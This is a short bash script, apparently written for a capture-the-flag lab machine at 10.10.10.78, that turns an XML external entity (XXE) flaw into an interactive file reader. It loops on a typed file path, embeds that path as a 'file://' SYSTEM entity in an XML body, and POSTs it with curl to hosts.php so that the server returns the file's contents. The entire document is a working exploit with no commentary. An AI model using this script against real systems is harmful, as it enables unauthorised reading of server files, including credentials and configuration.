#!/bin/bash

function def_handler(){
	echo -e "\n\n[!]Saindo...\n\n"
	exit 1
}

# Ctrl + C
trap def_handler INT

# Variables_Global
main_url="http://10.10.10.78/hosts.php"

while true; do
	echo -n "#> " && read -r command
	xml=$(echo -e '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY file SYSTEM "file://'$command'">\n]>\n<details>\n\t<subnet_mask>&file;</subnet_mask>\n\t<test></test>\n</details>')
	curl -s -X POST "$main_url" --data-binary "$xml"
done
